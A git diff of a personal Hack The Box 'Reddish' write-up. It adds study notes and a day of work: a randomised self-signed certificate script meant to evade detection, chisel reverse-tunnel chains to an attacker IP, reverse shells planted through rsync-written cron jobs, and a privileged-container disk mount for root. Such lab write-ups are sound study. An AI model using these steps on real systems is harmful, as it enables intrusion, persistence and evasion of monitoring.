@@ -8,7 +8,7 @@ To practice:
 - Different ways pivot, how to, the limitation, risks
 - Linux related machines not done one recently 
 - Database hacking
-- Be handheld through an insane machine to know how far I many connections in my brain I have to go - roughly scaled between scarily alot and ton
+- Be handheld through an insane machine to know how far I many connections in my brain I have to go - roughly scaled between scarily alot and too much of a  ton
 	- Reasoning comes from being good guitar. Sometime you just to sit there and be wowed and try anyway, clumsy try, find the parts that are difficult and find similarly easiler elements elsewhere, [More Rocky](https://www.youtube.com/watch?v=hHpFSQMUxj4), [More Cheesey](https://www.youtube.com/watch?v=yGZsnbPCv1I) or [More British](https://www.youtube.com/watch?v=pt-Yc2rzOOM) or more [Bass](https://www.youtube.com/watch?v=Sa0upTDZDYQ) or [Spanish](https://www.youtube.com/watch?v=NIKWBdthzg4) - combine all of that and keep building
 Learnt:
 1. I need to try switching more Web Requests
@@ -24,6 +24,14 @@ Learnt:
 9. The power of `nohup`  and `&` 
 10. WILDCARDS in PrivEsc
 11. Linpeas.sh pivot-delivery 
+12. Requirement of CMD-by-CMD
+13. Requirement of "Crouching in your report work, evaluating your capability"
+14. Requirement of Helped-Throughs and Reruns of machines
+15. Insane machine tend to probe all areas of understanding and are more about the endurance of being open to breaking patterns - i.e it is a long process wher eeach section is different meaning that your common patterns are exposed and moving to a mindset of "Step back and comprehend is vital"   
+16. Xargs revision
+17. Intro to rsync
+18. Exclaridraw is a free solution to mapping out a network visually which is better than the alternative of working with abstract addressing tables
+ 
 Beyond Root:
 - Omni-Tool-Usage for port redirection - but demostrate with Ubuntu server for tools cannot just install onto the box 
 - Clarity over all possible options 
@@ -632,9 +640,200 @@ I really want to try get linpeas.sh to tunnel output to 10005, I tried just a te
 I woops the filename - very Network packet economy Level "Hello did someone order a exfiltration" bad-OPSEC, but very cool 
 ![](linpeasdelivery.png)
 
-The question Ippsec says we should be asking about the script is that where is the password? We are stil in the docker container, but as root.
+The question Ippsec says we should be asking about the script is that where is the password? We are still in the docker container, but as root.
+
+## Day 13: Return to complete - www
+
+As of Day 13 I know I can finish this today and would I like to do with the flair of one addition to the overall process, which encrypting the entire chisel setup and going very pro and not in the final sections use just one shell. I want really take away a much as I can from using `chisel` and for the other tools try them with comparison to chisel. The major observence was the pure simplicity of xct tradecraft.
+1. Create and host a self signed TLS certificate for my encrypted tunnels
+2. Continue have nice copy-and-pasted-automated (be more experiemental and local test driven) work flow of reverse-shells and the cert - also just to try
+3. Use the `--fingerprint` flag aswell.  Why does not not force usage!
+
+Reddish has demonstrated the need to split Notes unlike xct or Ippsec into X-CMD-by-CMDs and Notes. This helps with visibility of information, but also removes soooo much busy work from doing machines. I am hoping that this machine is last machine where I am crouched in the Writeup and Notes and move to more a report-post completion type scheduling. My reasoning for the current approach was to slow down and focus on the how and why I was doing something whereas now I need to either switch out and state this approach from the beginning like a helped-through or be more focused on the objective of completing machine and problem solving the machine not troubleshooting the what I doing wrong or where I have not found weakness in my fundementals or method or thinking. 
+
+I will keep both sets of the commands for my own triumphant learning curvage, for demonstration and for easy of expansion. [Inspired by Techshoolguru Ariticle](https://dev.to/techschoolguru/how-to-create-sign-ssl-tls-certificates-2aai)
+
+By default chisel uses the CA from the host making it OPSEC unsafe so:
+- Make a self-signed TLS - no interactive other than copy and paste passphrase just pure cli 
+-  Notes: fields are not checked so can just put anything: Scripting this for more randomised certs 
+```bash
+#!/bin/bash
+
+passphrase=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
+echo -n $passphrase > passphrase.out
+# Because I need to learn how to suppy user prompt input during a command
+echo ""
+echo "Passphrase generation:"
+echo "$passphrase"
+echo ""
+echo "Just cat passphrase.out for easy copy and paste"
+echo ""
+echo ""
+touch server-ext.cnf
+
+# Dry-Run with: `-nodes` flag in creating CAm server private key
+
+# CA
+# Mitigation of this is filter by entropy of any field and drop
+# Ideally this would be tunneled through another 'legitimate' looking protocols, bouncing in and out of the internal network to the internet
+# Meering adds an extra level of jibbish to avoid human interaction on cert creation
+# /C=$country
+country=$(tr -dc 'A-Za-z' </dev/urandom | head -c 2 | xargs -n 1 | tr -d '\n' | tr -d "[:space:]")
+# /ST=$state_or_province
+state_or_province=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
+# /L=$city
+city=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
+# /O=$organisation
+organisation=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
+# /OU=$organisational_unit
+organisational_unit=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
+# /CN=$domain_name
+domain_name=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
+# /emailAddress=$orgemail
+org_email=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
+
+# Create CA's private key and certificate
+openssl req -x509 -newkey rsa:4096 -days 365 -keyout ca-key.pem -out ca-cert.pem -subj "/C=$country/ST=$state_or_province/L=$city/O=$organisation/OU=$organisational_unit/CN=$domain_name/emailAddress=$org_email"
+
+# Server Private Key
+openssl req -newkey rsa:4096 -keyout server-key.pem -out server-req.pem -subj "/C=$country/ST=$state_or_province/L=$City/O=$organisation/OU=$organisational_unit/CN=$domain_name/emailAddress=$org_email"
+
+# Sign the server's certificate request
+# -CAcreateserial - for ID per certificate it will sign
+# -days default is 30 days
+# -extfile for x509 confif file
+openssl x509 -req -in server-req.pem  -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial -out server-cert.pem -extfile server-ext.cnf
+
+# Output cert
+echo ""
+echo "CA's self-signed certificate"
+openssl x509 -in ca-cert.pem -noout -text
+# Provide certification verification  help
+echo ""
+echo "Verify certificate:"
+echo "openssl verify -CAfile ca-cert.pem server-cert.pem"
+echo ""
+echo "Your Passphrase is:"
+echo "$passphrase"
+echo "For further usage just cat passphrase.out for easy copy and paste"
+echo ""
+exit
+```
+
+Unfortunately custom tls is not implemented and I do not have the time to fork and implement fully.  
+1. Does not actually parse flags 
+2. Does not actually do anything but create a default seeding for keys.
+```go
+//generate private key (optionally using seed)
+key, err := ccrypto.GenerateKey(c.KeySeed)
+if err != nil {
+	log.Fatal("Failed to generate key")
+}
+
+//convert into ssh.PrivateKey
+private, err := ssh.ParsePrivateKey(key)
+if err != nil {
+	log.Fatal("Failed to parse key")
+}
+```
+
+Two hours of TLS and bash, chisel source code later I feel like I need to justify this to myself at this point:
+1. I made a script that is future use proofed for other tasks related to  tls
+2. I learnt about CA management
+3. Bash random strings and cli cryptography
+
+Considering VPN ip continous changes I added to all new  `*-CMD-by-CMDs.md`
+```bash
+sed -i 's/$oldip/$newip/g' *-CMD-by-CMDs.md
+```
+
+Also upgraded data colleciton options for network sweeping and port scanning - [[4]]. Then upgraded my mkCTFdir script and [[4]] again.
+
+I then released after all that I needed `--key`! Never again..
+
+Moving forward with [0xdf](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#rsync-access) rsync has read and write access as it needs to write a backup and read it toop check validity of execution. Therefore it because the script indicate where it is backing up to - aka it is the endpoint we can also control as the root user 
+![](rsyncisprived.png)
+
+Before doing the cron that 0xdf does I want to go full manual with the manpage and understood rsync cant read the file system like I hoped and continued on
+
+Because we are cool create another two-rs named cron-esc and change the port number for the following backed-up cron. Without watching the Ippsec video:
+```bash
+# First start s listener on your host
+rlwrap ncat -lvnp 10007
+# Then on the www machine as Root
+# Create a tunnel with chisel back to NodeRed client
+# this did not work
+# nohup ./chisel client 10.10.14.24:10000 R:127.0.0.1:10007:172.19.0.4:10007 &
+# Node Red - Know I could just kill jobs
+nohup ./chisel client 10.10.14.24:10000 10008:127.0.0.1:10008 &
+# Www as root
+nohup ./chisel client 10.10.14.24:10000 R:127.0.0.1:10008:172.19.0.4:10008 &
+
+chmod +x * /tmp/* 
+cp two-rs cron-esc.s
+# - First attempt
+sed -i 's/172.19.0.4/172.19.0.3/g' cron-esc.sh
+sed -i 's/10006/10007/g' cron-esc.sh
+# - Second attempt
+sed -i 's/172.19.0.3/172.20.0.3/g' cron-esc.sh
+sed -i 's/10007/10008/g' cron-esc.sh
+rsync -a cron-esc.sh rsync://backup:873/src/tmp/
+echo '* * * * * root sh /tmp/cron-esc.sh' > shell
+rsync -a shell rsync://backup:873/src/etc/cron.d/
 
 
+rsync rsync://backup:873/src/tmp/
+rsync rsync://backup:873/src/etc/cron.d/
+
+```
+
+Checked [Ippsec Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=3615s) after both attempts failed
+
+I only had one thing wrong! - I thought that the endpoint would always be the server but with the chain of tunnels it can be the client
+```bash
+kali -> nodered  -> www  -> backup
+# kali 
+rlwrap ncat -lvnp 10007 
+# nodered = 10000 because the kali serveris 10000 
+chisel client kali:10000 10007:127.0.0.1:10000 
+# www - 10007 
+chisel client noderedIP:10007 10007:127.0.0.1:10007
+``` 
+
+Wow
+![](insidethebackup.png)
+
+
+Check for docker container is running `--privileged`, meaning we are can mount to these disks as containerr does not need disks 
+```bash
+ls /dev/ | grep sda
+mount /dev/sdaX /mnt
+# For me it was sda2
+```
+
+![](wearerunningwithdockermisconfiguration.png)
+
+Because OSCP and the like require root on the book we can then do another chisel chain of pwnage. Again this time no Ippsec; I tried:
+```bash
+# Kali
+rlwrap ncat -lvnp 10008
+# NodeRed
+nohup ./chisel client 10.10.14.24:10000 10008:127.0.0.1:10000 &
+# www - Root shell to open 10008 on kali
+nohup ./chisel client 172.19.0.4:10008 10008:127.0.0.1:10008 &
+# Connect back www 
+nohup ./chisel client 172.20.0.3:10008 10008:127.0.0.1:10008 &
+# WE already have cron-esc.sh so
+cp cron-esc.sh bigroot.sh
+sed -i 's/cron-esc/bigroot/g' shell
+sed -i 's/172.20.0.3/172.20.0.2/g' bigroot.sh
+sed -i 's/10007/10008/g' bigroot.sh
+cp bigroot.sh /mnt/tmp/
+cp /etc/cron.d/shell /mnt/etc/cron.d/
+```
+
+The box is actually externally facing! so no chisel is actually required - went full chisel and not thinking that are on the host that has to be externally facing and we do not need to go through the virtualised network 
+![](rootroot.png)
 
 
 ## Beyond Root
